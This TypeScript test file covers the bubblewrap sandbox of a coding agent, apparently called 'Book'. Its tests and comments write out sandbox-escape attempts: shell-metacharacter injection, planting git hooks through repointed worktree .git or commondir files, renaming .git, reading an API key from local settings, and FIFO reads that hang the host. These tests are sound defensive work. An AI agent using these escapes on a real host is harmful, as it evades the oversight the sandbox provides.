      // Both are writable inside the namespace: the read-write bind is the last
      // mount of the path, so it is the one in force.
      expect(lastMountFor(exec.args, '/work/.book/cache').flag).toBe('--bind');
      expect(lastMountFor(exec.args, '/work/.git/hooks').flag).toBe('--bind');
      // ...and the entries are applied after the read-only mounts that would
      // otherwise shadow them.
      expect(lastMountFor(exec.args, '/work/.book/cache').index).toBeGreaterThan(
        mountsFor(exec.args, '/work/.book').index,
      );
      expect(lastMountFor(exec.args, '/work/.git/hooks').index).toBeGreaterThan(
        mountsFor(exec.args, '/work/.git/config').index,
      );
    });

    it('leaves an entry above a protected path before it, so a broad root cannot reopen it', () => {
      // The workspace itself, or any parent of it: binding it read-write is
      // where it was anyway, and letting it come after the protections would
      // turn the default back off again.
      const settings = sandboxSettings();
      settings.filesystem.allowWrite = ['/work'];

      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', WORKSPACE, settings, host());

      expect(mountsFor(exec.args, '/work/.book').index).toBeGreaterThan(
        mountsFor(exec.args, '/work').index,
      );
      expect(mountsFor(exec.args, '/work/.git/hooks').index).toBeGreaterThan(
        mountsFor(exec.args, '/work').index,
      );
    });
  });
});

describe('unbindablePaths', () => {
  it('reports configured paths that cannot be applied', () => {
    const settings = sandboxSettings();
    settings.filesystem.denyRead = ['/definitely/not/real', '~/also-not-real-xyz'];
    settings.filesystem.allowWrite = [tmpdir()];
    expect(unbindablePaths(settings)).toEqual(['/definitely/not/real', '~/also-not-real-xyz']);
  });
});

describe('createSandbox', () => {
  it('returns null when sandbox.enabled is false', () => {
    expect(createSandbox(sandboxSettings({ enabled: false }))).toBeNull();
  });

  it('warns that domain rules cannot be enforced', () => {
    const settings = sandboxSettings();
    settings.network.allowedDomains = ['github.com'];
    const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const sandbox = createSandbox(settings);
    if (sandbox) {
      expect(warnSpy.mock.calls.flat().join(' ')).toMatch(/domain rules cannot be enforced/i);
    }
    warnSpy.mockRestore();
  });

  it('throws when failIfUnavailable is true and the sandbox cannot be built', () => {
    const settings = sandboxSettings({ failIfUnavailable: true });
    try {
      expect(['object', 'null']).toContain(typeof createSandbox(settings));
    } catch (e) {
      expect(e).toBeInstanceOf(Error);
      expect((e as Error).message).toMatch(/bwrap|sandbox|Windows/i);
    }
  });
});

describe('Bash tool integration with sandbox', () => {
  let dir: string;
  const ctx = {
    workspaceRoot: '',
    env: {},
    sandbox: undefined as ResolvedSettings['sandbox'] | undefined,
  };

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'book-sandbox-'));
    ctx.workspaceRoot = dir;
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  it('runs commands normally when sandbox is disabled', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings({ enabled: false });
    const r = createDefaultRegistry();
    const result = await r.execute(
      { id: 'c1', name: 'Bash', arguments: { command: 'echo hello' } },
      ctx,
    );
    expect(result.status).toBe('success');
    expect(result.content).toContain('hello');
    expect(result.content).not.toContain('[sandboxed]');
  });

  it('marks output as [sandboxed] when sandbox is enabled and available', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return; // no bwrap on this host

    const r = createDefaultRegistry();
    const result = await r.execute(
      { id: 'c1', name: 'Bash', arguments: { command: 'echo hello' } },
      ctx,
    );
    expect(result.status).toBe('success');
    expect(result.content).toContain('[sandboxed]');
    expect(result.content).toContain('hello');
  });

  it('still supports shell syntax inside the sandbox', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return;

    const r = createDefaultRegistry();
    const result = await r.execute(
      { id: 'c1', name: 'Bash', arguments: { command: 'echo one && echo two | tr a-z A-Z' } },
      ctx,
    );
    expect(result.status).toBe('success');
    expect(result.content).toContain('one');
    expect(result.content).toContain('TWO');
  });

  it('refuses a workdir outside the workspace rather than binding it', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return;

    // Binding a model-supplied workdir is a complete escape: `--bind / /`
    // emitted after the default mounts shadows all of them.
    const escapeTarget = join(tmpdir(), `book-sandbox-workdir-${process.pid}.txt`);
    rmSync(escapeTarget, { force: true });

    const r = createDefaultRegistry();
    const result = await r.execute(
      {
        id: 'c1',
        name: 'Bash',
        arguments: { command: `touch ${escapeTarget}`, workdir: '/' },
      },
      ctx,
    );

    try {
      expect(result.status).not.toBe('success');
      expect(result.content + (result.structuredError?.message ?? '')).toMatch(
        /outside the sandboxed workspace/i,
      );
      expect(existsSync(escapeTarget)).toBe(false);
    } finally {
      rmSync(escapeTarget, { force: true });
    }
  });

  it('confines writes reached through shell metacharacters to the sandbox', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return;

    // The escape this guards against: when the wrapper is joined into one
    // string and spawned with `shell: true`, the host shell splits on `;` and
    // runs the second command outside bwrap entirely.
    const escapeTarget = join(tmpdir(), `book-sandbox-escape-${process.pid}.txt`);
    rmSync(escapeTarget, { force: true });
    const inside = join(dir, 'inside.txt');

    const r = createDefaultRegistry();
    const result = await r.execute(
      {
        id: 'c1',
        name: 'Bash',
        arguments: { command: `echo contained > ${inside}; echo pwned > ${escapeTarget}` },
      },
      ctx,
    );

    try {
      expect(result.status).toBe('success');
      // The workspace bind is real: the in-workspace write reaches the host.
      expect(existsSync(inside)).toBe(true);
      // /tmp is a tmpfs inside the sandbox, so the second write never lands.
      expect(existsSync(escapeTarget)).toBe(false);
    } finally {
      rmSync(escapeTarget, { force: true });
    }
  });
});

/**
 * The argv is only a claim; this is the claim under a real bubblewrap. Every
 * path here is one the host acts on *after* the sandboxed command exits, which
 * is what makes a write to it an escape rather than a nuisance.
 */
describe.skipIf(!sandboxBackendAvailable())(
  'workspace control files are read-only in a real sandbox',
  () => {
    /**
     * A throwaway git repository with the control files already present, since
     * "a hook the host would run" needs a hook to exist.
     */
    function freshRepo(options: { book?: boolean } = {}): string {
      const repo = mkdtempSync(join(tmpdir(), 'book-sandbox-ro-'));
      execFileSync('git', ['init', '--quiet'], { cwd: repo });
      mkdirSync(join(repo, '.git', 'hooks'), { recursive: true });
      writeFileSync(join(repo, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\nexit 0\n');
      writeFileSync(join(repo, '.git', 'config'), '[core]\n\trepositoryformatversion = 0\n');
      if (options.book) {
        mkdirSync(join(repo, '.book'), { recursive: true });
        writeFileSync(join(repo, '.book', 'settings.json'), '{}\n');
      }
      return repo;
    }

    /** A sandbox override as the loader applies one: shallow, per-object. */
    type SandboxOverrides = Partial<Omit<ResolvedSettings['sandbox'], 'filesystem'>> & {
      filesystem?: Partial<ResolvedSettings['sandbox']['filesystem']>;
    };

    async function sandboxedBash(
      command: string,
      workspace: string,
      overrides: SandboxOverrides = {},
    ): Promise<{ status: string; content: string }> {
      const { createDefaultRegistry } = await import('./tools/registry.js');
      const base = sandboxSettings({ allowUnsandboxedCommands: false });
      const result = await createDefaultRegistry().execute(
        { id: 'c1', name: 'Bash', arguments: { command } },
        {
          workspaceRoot: workspace,
          env: {},
          sandbox: {
            ...base,
            ...overrides,
            filesystem: { ...base.filesystem, ...overrides.filesystem },
          },
        },
      );
      return {
        status: result.status,
        content: `${result.content}\n${result.structuredError?.message ?? ''}`,
      };
    }

    it('still writes an ordinary workspace file', async () => {
      const repo = freshRepo();
      try {
        const result = await sandboxedBash(`printf 'ok' > notes.txt`, repo);

        expect(result.status).toBe('success');
        expect(readFileSync(join(repo, 'notes.txt'), 'utf8')).toBe('ok');
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    });

    it('refuses to write .book/settings.local.json where .book exists', async () => {
      const repo = freshRepo({ book: true });
      try {
        const result = await sandboxedBash(`printf 'pwned' > .book/settings.local.json`, repo);

        expect(result.status).not.toBe('success');
        expect(result.content.toLowerCase()).toMatch(/read-only file system/);
        expect(existsSync(join(repo, '.book', 'settings.local.json'))).toBe(false);
        expect(readFileSync(join(repo, '.book', 'settings.json'), 'utf8')).toBe('{}\n');
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    });

    it('refuses to create .book where none exists', async () => {
      const repo = freshRepo();
      try {
        const result = await sandboxedBash(`printf 'pwned' > .book/settings.local.json`, repo);

        expect(result.status).not.toBe('success');
        expect(result.content.toLowerCase()).toMatch(/read-only file system/);
        expect(existsSync(join(repo, '.book', 'settings.local.json'))).toBe(false);
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    });

    it('refuses to write git hooks and .git/config, leaving them unchanged', async () => {
      const repo = freshRepo();
      try {
        for (const target of ['.git/hooks/pre-commit', '.git/config']) {
          const result = await sandboxedBash(`printf 'pwned' > ${target}`, repo);

          expect(result.status, target).not.toBe('success');
          expect(result.content.toLowerCase(), target).toMatch(/read-only file system/);
        }
        // The host still holds what it held: the next `git commit` on the host
        // runs the original hook and reads the original config.
        expect(readFileSync(join(repo, '.git', 'hooks', 'pre-commit'), 'utf8')).toBe(
          '#!/bin/sh\nexit 0\n',
        );
        expect(readFileSync(join(repo, '.git', 'config'), 'utf8')).toBe(
          '[core]\n\trepositoryformatversion = 0\n',
        );
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    });

    /**
     * Read-only *children* of a git dir were not enough, because the file that
     * *selects* the git dir stayed writable. Every command below was reproduced
     * against this host: a sandboxed command pointed git at a repository it
     * built, and the host's next `git commit` ran the hook that command had
     * planted. The point of each case is the *host* file afterwards — a write
     * that fails inside the namespace and still changes the file would be no
     * protection at all.
     */
    describe('git pointer files', () => {
      /** A repository with a linked worktree, whose `.git` is a one-line file. */
      function repoWithWorktree(): { main: string; worktree: string; pointer: string } {
        const main = freshRepo();
        const worktree = mkdtempSync(join(tmpdir(), 'book-sandbox-wt-'));
        rmSync(worktree, { recursive: true, force: true });
        execFileSync('git', ['worktree', 'add', '--quiet', worktree, '-b', 'wt'], { cwd: main });
        return { main, worktree, pointer: readFileSync(join(worktree, '.git'), 'utf8') };
      }

      /** A repository with a submodule, whose git dir is `.git/modules/<name>`. */
      function repoWithSubmodule(): { main: string; source: string; sub: string } {
        const main = freshRepo();
        const source = mkdtempSync(join(tmpdir(), 'book-sandbox-sub-src-'));
        const sub = 'sub';
        execFileSync('git', ['init', '--quiet'], { cwd: source });
        writeFileSync(join(source, 'a.txt'), 'a\n');
        execFileSync('git', ['add', 'a.txt'], { cwd: source });
        execFileSync(
          'git',
          [
            '-c',
            'user.email=book@example.invalid',
            '-c',
            'user.name=book',
            'commit',
            '--quiet',
            '-m',
            'init',
          ],
          { cwd: source },
        );
        execFileSync(
          'git',
          [
            '-c',
            'protocol.file.allow=always',
            '-c',
            'user.email=book@example.invalid',
            '-c',
            'user.name=book',
            'submodule',
            'add',
            '--quiet',
            source,
            sub,
          ],
          { cwd: main },
        );
        return { main, source, sub };
      }

      it('refuses to repoint a worktree .git file at a repository the command built', async () => {
        const { main, worktree, pointer } = repoWithWorktree();
        try {
          // The whole escape in one line: build a bare repo with a hook, then
          // make this worktree's git point at it. Before the fix the host's
          // `git commit` in `worktree` ran the hook this command wrote.
          const result = await sandboxedBash(
            `git init --quiet --bare evil && printf '#!/bin/sh\\ntouch pwned\\n' > evil/hooks/pre-commit && chmod +x evil/hooks/pre-commit && printf 'gitdir: evil\\n' > .git`,
            worktree,
          );

          expect(result.status).not.toBe('success');
          // The scratch repo is fine — the workspace is writable. The pointer
          // the host reads is what matters, and it is untouched, so the host's
          // git still resolves to this worktree's own git dir and not to `evil`.
          expect(readFileSync(join(worktree, '.git'), 'utf8')).toBe(pointer);
          expect(
            execFileSync('git', ['-C', worktree, 'rev-parse', '--absolute-git-dir'], {
              encoding: 'utf8',
            }).trim(),
          ).toContain('worktrees');
          // And nothing the command planted has run.
          expect(existsSync(join(worktree, 'pwned'))).toBe(false);
        } finally {
          rmSync(main, { recursive: true, force: true });
          rmSync(worktree, { recursive: true, force: true });
        }
      });

      it('refuses to rewrite the commondir a linked worktree resolves through', async () => {
        const { main, worktree } = repoWithWorktree();
        const pointer = join(main, '.git', 'worktrees', basename(worktree), 'commondir');
        try {
          const before = readFileSync(pointer, 'utf8');
          const result = await sandboxedBash(
            `mkdir -p evil/hooks && printf '#!/bin/sh\\ntouch pwned\\n' > evil/hooks/pre-commit && printf '../evil\\n' > .git/worktrees/${basename(worktree)}/commondir`,
            main,
          );

          expect(result.status).not.toBe('success');
          expect(readFileSync(pointer, 'utf8')).toBe(before);
          expect(existsSync(join(main, 'pwned'))).toBe(false);
          // The worktree still resolves to a git dir that exists.
          expect(
            execFileSync('git', ['-C', worktree, 'rev-parse', '--git-dir'], {
              encoding: 'utf8',
            }).trim(),
          ).toContain('worktrees');
        } finally {
          rmSync(main, { recursive: true, force: true });
          rmSync(worktree, { recursive: true, force: true });
        }
      });

      it('refuses to write a submodule git dir hooks or config', async () => {
        const { main, source, sub } = repoWithSubmodule();
        try {
          const hook = join(main, '.git', 'modules', sub, 'hooks', 'pre-commit');
          const config = join(main, '.git', 'modules', sub, 'config');
          const hookBefore = existsSync(hook) ? readFileSync(hook, 'utf8') : null;
          const configBefore = readFileSync(config, 'utf8');

          for (const target of [
            `.git/modules/${sub}/hooks/pre-commit`,
            `.git/modules/${sub}/config`,
          ]) {
            const result = await sandboxedBash(`printf 'pwned' > ${target}`, main);
            expect(result.status, target).not.toBe('success');
            expect(result.content.toLowerCase(), target).toMatch(/read-only file system/);
          }

          expect(existsSync(hook) ? readFileSync(hook, 'utf8') : null).toBe(hookBefore);
          expect(readFileSync(config, 'utf8')).toBe(configBefore);
        } finally {
          rmSync(main, { recursive: true, force: true });
          rmSync(source, { recursive: true, force: true });
        }
      });

      it('refuses to rename the git directory away, which a child mount does not stop', async () => {
        // rename(2) on a path that is not a mount point succeeds, so read-only
        // `hooks/` and `config` inside a writable `.git` are not protection: the
        // whole directory moves out and a fresh writable one takes its place.
        const repo = freshRepo();
        try {
          const result = await sandboxedBash(`mv .git .git.old && git init --quiet .git.old`, repo);

          expect(result.status).not.toBe('success');
          expect(result.content.toLowerCase()).toMatch(/busy|read-only/);
          // The git dir is still the one the host had, hooks and all.
          expect(existsSync(join(repo, '.git', 'hooks', 'pre-commit'))).toBe(true);
          expect(existsSync(join(repo, '.git.old'))).toBe(false);
          expect(readFileSync(join(repo, '.git', 'config'), 'utf8')).toBe(
            '[core]\n\trepositoryformatversion = 0\n',
          );
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('refuses to write the hooks directory core.hooksPath names', async () => {
        // husky v9 does exactly this: `core.hooksPath = .husky/_`. Protecting
        // `hooks/` while leaving the directory git would actually run from
        // writable protects a directory git never looks at.
        const repo = freshRepo();
        try {
          mkdirSync(join(repo, '.husky'), { recursive: true });
          writeFileSync(join(repo, '.husky', 'pre-commit'), '#!/bin/sh\nexit 0\n');
          execFileSync('git', ['config', 'core.hooksPath', '.husky'], { cwd: repo });

          const result = await sandboxedBash(`printf 'pwned' > .husky/pre-commit`, repo);

          expect(result.status).not.toBe('success');
          expect(result.content.toLowerCase()).toMatch(/read-only file system/);
          expect(readFileSync(join(repo, '.husky', 'pre-commit'), 'utf8')).toBe(
            '#!/bin/sh\nexit 0\n',
          );
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('refuses to create the hooks directory core.hooksPath names', async () => {
        const repo = freshRepo();
        try {
          execFileSync('git', ['config', 'core.hooksPath', '.husky/_'], { cwd: repo });

          const result = await sandboxedBash(
            `mkdir -p .husky/_ && printf '#!/bin/sh\\ntouch pwned\\n' > .husky/_/pre-commit`,
            repo,
          );

          expect(result.status).not.toBe('success');
          expect(existsSync(join(repo, '.husky', '_', 'pre-commit'))).toBe(false);
          expect(existsSync(join(repo, 'pwned'))).toBe(false);
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('explains the read-only config when git cannot write it', async () => {
        // The config is read-only to stop a command repointing `core.hooksPath`,
        // and git reports the consequence in words that name no cause: "could not
        // write config file". With no note, the model retries the same command, or
        // rewrites it to route around the config, instead of running it where the
        // config is writable.
        const repo = freshRepo();
        try {
          const result = await sandboxedBash(
            `git remote add origin https://example.test/repo.git`,
            repo,
          );

          expect(result.status).not.toBe('success');
          expect(result.content).toMatch(/could not write config file|could not lock config file/);
          expect(result.content).toContain('.git/config is read-only inside the sandbox');
          // Said once, not once per stream the text appears in.
          expect(result.content.match(/read-only inside the sandbox/g)).toHaveLength(1);
          // And the repository did not gain the remote, on the host.
          expect(readFileSync(join(repo, '.git', 'config'), 'utf8')).not.toContain('example.test');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('still commits inside the sandbox, because the git dir stays writable', async () => {
        // The pin is a writable self-bind, not a read-only mount: sandboxed git
        // still has to be able to write objects, refs and its own index.
        const repo = freshRepo();
        try {
          const result = await sandboxedBash(
            `printf 'hello\\n' > a.txt && git add a.txt && git -c user.email=book@example.invalid -c user.name=book commit --quiet -m 'inside the sandbox'`,
            repo,
          );

          expect(result.status).toBe('success');
          expect(
            execFileSync('git', ['log', '--oneline'], { cwd: repo, encoding: 'utf8' }),
          ).toContain('inside the sandbox');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });
    });

    describe('control files a workspace can ship in another shape', () => {
      it('hides an existing settings.local.json from the command', async () => {
        // The namespace shares the host network, so a credential the user put
        // in the local layer is one `cat` away from a sandboxed command unless
        // the file's *contents* are masked, not just its mode.
        const repo = freshRepo({ book: true });
        const local = join(repo, '.book', 'settings.local.json');
        writeFileSync(local, JSON.stringify({ provider: { apiKey: 'sk-secret' } }));
        try {
          // The masked path is /dev/null, so the read fails closed rather than
          // returning an empty file: either way the key is not there.
          const result = await sandboxedBash(`cat .book/settings.local.json || true`, repo);

          expect(result.status).toBe('success');
          expect(result.content).not.toContain('sk-secret');
          // The host still has it: this is a mask inside the namespace.
          expect(readFileSync(local, 'utf8')).toContain('sk-secret');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('refuses to write .bookrc.json, which the host reads on the next launch', async () => {
        const repo = freshRepo();
        const rc = join(repo, '.bookrc.json');
        writeFileSync(rc, JSON.stringify({ baseUrl: 'https://api.example.test' }));
        try {
          const result = await sandboxedBash(`printf '{}' > .bookrc.json`, repo);

          expect(result.status).not.toBe('success');
          expect(result.content.toLowerCase()).toMatch(/read-only file system/);
          expect(readFileSync(rc, 'utf8')).toContain('api.example.test');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('still runs a command when .book is a symlink a repository shipped', async () => {
        // `--tmpfs` on a link cannot mkdir, and a link to a directory is "Can't
        // bind mount": either shape aborted the whole bwrap invocation, so a
        // clone could break every sandboxed command in the workspace.
        for (const target of ['.book-real', 'nowhere']) {
          const repo = freshRepo();
          try {
            symlinkSync(target, join(repo, '.book'));
            const result = await sandboxedBash(`printf 'ok' > notes.txt`, repo);

            expect(result.status, target).toBe('success');
            expect(readFileSync(join(repo, 'notes.txt'), 'utf8')).toBe('ok');
          } finally {
            rmSync(repo, { recursive: true, force: true });
          }
        }
      });

      it('protects a symlinked .book through its target', async () => {
        const repo = freshRepo();
        try {
          mkdirSync(join(repo, '.book-real'));
          writeFileSync(join(repo, '.book-real', 'settings.json'), '{}\n');
          symlinkSync('.book-real', join(repo, '.book'));

          const result = await sandboxedBash(`printf 'pwned' > .book-real/settings.json`, repo);

          expect(result.status).not.toBe('success');
          expect(readFileSync(join(repo, '.book-real', 'settings.json'), 'utf8')).toBe('{}\n');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });
    });

    describe('allowWrite over a protected path', () => {
      it('lets a user write inside a protected path they asked for', async () => {
        // A hook installer that has to write `.git/hooks/pre-commit`, a cache
        // under `.book/cache`: the protected mounts used to be emitted after
        // every `allowWrite` bind, so the entry was silently overridden.
        const repo = freshRepo({ book: true });
        try {
          const result = await sandboxedBash(
            `printf 'installed\\n' > .git/hooks/post-commit`,
            repo,
            {
              filesystem: {
                allowWrite: [join(repo, '.git', 'hooks'), join(repo, '.book')],
              },
            },
          );

          expect(result.status).toBe('success');
          expect(readFileSync(join(repo, '.git', 'hooks', 'post-commit'), 'utf8')).toBe(
            'installed\n',
          );
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('does not let an entry above a protected path reopen it', async () => {
        const repo = freshRepo({ book: true });
        try {
          const result = await sandboxedBash(`printf 'pwned' > .book/settings.json`, repo, {
            filesystem: { allowWrite: [repo] },
          });

          expect(result.status).not.toBe('success');
          expect(readFileSync(join(repo, '.book', 'settings.json'), 'utf8')).toBe('{}\n');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });
    });
  },
);

describe('matchesExcludedCommand', () => {
  it('matches a glob pattern against the whole command', () => {
    expect(matchesExcludedCommand('docker build .', ['docker *'])).toBe(true);
    expect(matchesExcludedCommand('git status', ['docker *'])).toBe(false);
  });

  it('matches against the whole command, not the first line getPrimaryArg would keep', () => {
    // The permission path and the execution path must judge the same text.
    // getPrimaryArg truncates a command to its first line, so a pattern that
    // only matches the full text would be missed by a first-line matcher and
    // the command would be judged sandboxed while Bash ran it unsandboxed.
    const command = 'echo hello\ndocker run --privileged evil';
    expect(matchesExcludedCommand(command, [command])).toBe(true);
    expect(matchesExcludedCommand(command.split('\n')[0], [command])).toBe(false);
  });

  it('treats a missing pattern list as no exclusions', () => {
    expect(matchesExcludedCommand('anything', [])).toBe(false);
    expect(matchesExcludedCommand('anything', undefined)).toBe(false);
  });
});

describe('sandboxCoverage', () => {
  const available = () => true;
  const unavailable = () => false;

  it('reports a genuinely sandboxed command', () => {
    expect(sandboxCoverage('ls', sandboxSettings(), available)).toEqual({ sandboxed: true });
  });

  it('reports "disabled" when sandboxing is off', () => {
    expect(sandboxCoverage('ls', sandboxSettings({ enabled: false }), available)).toEqual({
      sandboxed: false,
      reason: 'disabled',
    });
  });

  it('reports "excluded" for a command matching sandbox.excludedCommands', () => {
    const settings = sandboxSettings({ excludedCommands: ['docker *'] });
    expect(sandboxCoverage('docker ps', settings, available)).toEqual({
      sandboxed: false,
      reason: 'excluded',
    });
    expect(sandboxCoverage('ls', settings, available)).toEqual({ sandboxed: true });
  });

  it('reports "unavailable" when the bubblewrap backend is missing', () => {
    expect(sandboxCoverage('ls', sandboxSettings(), unavailable)).toEqual({
      sandboxed: false,
      reason: 'unavailable',
    });
  });

  it('prefers "disabled" over "unavailable" so the diagnosis is the actionable one', () => {
    expect(sandboxCoverage('ls', sandboxSettings({ enabled: false }), unavailable)).toEqual({
      sandboxed: false,
      reason: 'disabled',
    });
  });

  it('does not probe the backend when sandboxing is disabled or the command is excluded', () => {
    const probe = vi.fn(() => true);
    sandboxCoverage('ls', sandboxSettings({ enabled: false }), probe);
    sandboxCoverage('docker ps', sandboxSettings({ excludedCommands: ['docker *'] }), probe);
    expect(probe).not.toHaveBeenCalled();
  });
});

describe('realSandboxHost', () => {
  let dir: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'book-sbx-host-'));
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  /**
   * These files are read to decide what to protect, from a path the workspace
   * controls, on every sandboxed command. Read unguarded, a FIFO at `.git` or
   * `<gitdir>/commondir` blocks that read for ever — so every sandboxed command
   * after it hangs on the host — and `/dev/zero` never ends at all.
   */
  it('reads at most a few KB of a control file', () => {
    const big = join(dir, 'commondir');
    writeFileSync(big, 'x'.repeat(1024 * 1024));

    expect(realSandboxHost.readFile(big)).toHaveLength(4096);
  });

  it('reads a short control file whole', () => {
    const pointer = join(dir, 'commondir');
    writeFileSync(pointer, '../.git-shared\n');

    expect(realSandboxHost.readFile(pointer)).toBe('../.git-shared\n');
  });

  it.skipIf(process.platform === 'win32')('never blocks on a FIFO and never reads a device', () => {
    // Both would hang here, which is the point: they return instead. `mkfifo`
    // is coreutils, so the fixture is made the way a workspace would make it.
    const fifo = join(dir, '.git');
    execFileSync('mkfifo', [fifo]);
    expect(realSandboxHost.readFile(fifo)).toBeNull();
    expect(realSandboxHost.readFile('/dev/zero')).toBeNull();
    expect(realSandboxHost.readFile('/dev/null')).toBeNull();
  });

  it('does not follow a symlink into one either', () => {
    const link = join(dir, '.git');
    symlinkSync('/dev/zero', link);

    // `lstat`, not `stat`: the link is not a regular file, whatever it names.
    expect(realSandboxHost.readFile(link)).toBeNull();
  });

  /**
   * A path can vanish between the probe that found it and the spawn that mounts
   * it. `statSync` throws for that, and a throw here aborts the whole bwrap
   * invocation — so a race would take out the command rather than skip a mount.
   */
  it('treats a path that is not there as absent rather than throwing', () => {
    const gone = join(dir, 'vanished');

    expect(() => realSandboxHost.isDirectory(gone)).not.toThrow();
    expect(realSandboxHost.isDirectory(gone)).toBe(false);
    expect(realSandboxHost.readFile(gone)).toBeNull();
    expect(realSandboxHost.readDir(gone)).toEqual([]);
    expect(realSandboxHost.entryKind(gone)).toBeNull();
    expect(realSandboxHost.linkTarget(gone)).toBeNull();
    expect(realSandboxHost.realpath(gone)).toBeNull();
  });

  it('tells a directory, a file and a link apart without following the link', () => {
    const sub = join(dir, 'sub');
    mkdirSync(sub);
    const file = join(dir, 'file');
    writeFileSync(file, 'x');
    const link = join(dir, 'link');
    symlinkSync(sub, link);

    expect(realSandboxHost.entryKind(sub)).toBe('directory');
    expect(realSandboxHost.entryKind(file)).toBe('file');
    expect(realSandboxHost.entryKind(link)).toBe('symlink');
    expect(realSandboxHost.linkTarget(link)).toBe(sub);
    expect(realSandboxHost.realpath(link)).toBe(realSandboxHost.realpath(sub));
    expect(realSandboxHost.readDir(dir).sort()).toEqual(['file', 'link', 'sub']);
  });
});

describe('withGitConfigReadOnlyNotice', () => {
  const CONFIG_ERROR = 'fatal: could not write config file .git/config: Read-only file system';

  it('adds the note once, and only once, for a sandboxed git that could not write the config', () => {
    const text = withGitConfigReadOnlyNotice(CONFIG_ERROR, CONFIG_ERROR, true);

    expect(text).toContain(CONFIG_ERROR);
    expect(text.match(/read-only inside the sandbox/g)).toHaveLength(1);
    expect(text).toMatch(/Run this command outside the sandbox/);
  });

  it('says nothing for an unsandboxed command, which has no read-only config', () => {
    expect(withGitConfigReadOnlyNotice(CONFIG_ERROR, CONFIG_ERROR, false)).toBe(CONFIG_ERROR);
  });

  it('says nothing for a failure that was not about the config', () => {
    const other = 'npm ERR! code ELIFECYCLE';
    expect(withGitConfigReadOnlyNotice(other, other, true)).toBe(other);
    expect(withGitConfigReadOnlyNotice('', '', true)).toBe('');
  });

  it('matches on the captured output, not only on the text it is appended to', () => {
    // `Check` reports a short summary while the config error is in the capture,
    // so the note has to be decided from both.
    const text = withGitConfigReadOnlyNotice('check failed (exit 1)', CONFIG_ERROR, true);
    expect(text).toContain('check failed (exit 1)');
    expect(text).toContain('.git/config is read-only inside the sandbox');
  });
});

describe('unsandboxedRefusalMessage', () => {
  it.each([
    ['disabled' as const, 'sandbox.enabled is false'],
    ['excluded' as const, 'sandbox.excludedCommands'],
    ['unavailable' as const, 'bubblewrap'],
  ])('names the setting and the reason for %s', (reason, expectedReason) => {
    const message = unsandboxedRefusalMessage(reason);
    expect(message).toContain('sandbox.allowUnsandboxedCommands');
    expect(message).toContain(expectedReason);
    // Actionable: it must say what to change, not only what failed.
    expect(message).toMatch(/set sandbox\.allowUnsandboxedCommands to true/);
    // And where such a setting takes effect, because a workspace layer is
    // ignored for this key and a user who edits the project's own settings to
    // "fix" a refusal stays refused (#373).
    expect(message).toContain('~/.book/settings.json');
    expect(message).toContain('--settings');
  });
});

describe('sandboxPolicySummary', () => {
  const active = { sandboxActive: true, adjudicationConfigured: false };

  it('reports refusal when allowUnsandboxedCommands is false', () => {
    const summary = sandboxPolicySummary(
      sandboxSettings({ allowUnsandboxedCommands: false }),
      active,
    );
    expect(summary.unsandboxedCommands).toContain('refused');
    expect(summary.unsandboxedCommands).toContain('sandbox.allowUnsandboxedCommands=false');
  });

  it('reports auto-allow as inert when no sandbox is actually active', () => {
    const summary = sandboxPolicySummary(sandboxSettings({ enabled: false }), {
      ...active,
      sandboxActive: false,
    });
    expect(summary.autoAllowBash).toContain('inert');
  });

  it('reports auto-allow as on only when a sandbox is actually active', () => {
    expect(sandboxPolicySummary(sandboxSettings(), active).autoAllowBash).toContain('on for');
  });

  // The auto-allow only stands in for the *default* ask, so any configured
  // deny/ask rule makes it inert. Reporting "on" there would tell the user the
  // sandbox is skipping prompts that Book is in fact still raising.
  it('reports auto-allow as inert when deny/ask rules are configured', () => {
    const summary = sandboxPolicySummary(sandboxSettings(), {
      ...active,
      adjudicationConfigured: true,
    });
    expect(summary.autoAllowBash).toContain('inert');
    expect(summary.autoAllowBash).toContain('permissions.deny/ask');
  });

  it('reports auto-allow as off when the key is false, even with an active sandbox', () => {
    const summary = sandboxPolicySummary(
      sandboxSettings({ autoAllowBashIfSandboxed: false }),
      active,
    );
    expect(summary.autoAllowBash).toContain('off');
    expect(summary.autoAllowBash).toContain('sandbox.autoAllowBashIfSandboxed=false');
  });
});
